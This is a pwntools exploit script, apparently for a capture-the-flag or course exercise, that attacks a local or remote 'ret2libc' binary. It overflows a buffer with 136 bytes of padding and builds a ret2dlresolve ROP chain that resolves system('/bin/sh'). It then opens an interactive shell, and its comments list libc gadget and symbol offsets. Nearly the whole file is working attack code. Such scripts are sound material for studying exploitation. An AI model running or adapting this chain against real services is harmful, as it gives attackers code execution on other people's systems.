from pwn import *

###################
### CONNECTION ####
###################
LOCAL = True
REMOTETCP = False
GDB = True

LOCAL_BIN = "../../source/ret2libc/ret2libc"

if LOCAL:
    elf = context.binary = ELF(LOCAL_BIN)
    proc = process(LOCAL_BIN)
    rop = ROP(elf)
elif REMOTETCP:
    proc = remote("140.113.24.241", 30173)
    elf = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(elf)

if GDB and LOCAL:
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(proc)

###################
###   PAYLOAD  ####
###################

# 0x000000000002a3e5: pop rdi; ret;
# 0x00000000001d8678: /bin/sh
# 0x0000000000050d70: system
# 0x00000000000455f0: exit

# 0x00007ffff7d87000: libc base
# 0x000000000040115e: ret

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.raw('X' * (128 + 8))
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

log.info(rop.dump())

proc.clean()
proc.sendline(rop.chain())
proc.sendline(dlresolve.payload)
# proc.sendline(rop.chain())
# leaked = proc.recvline()[:8].strip()
# print(leaked)
proc.interactive()
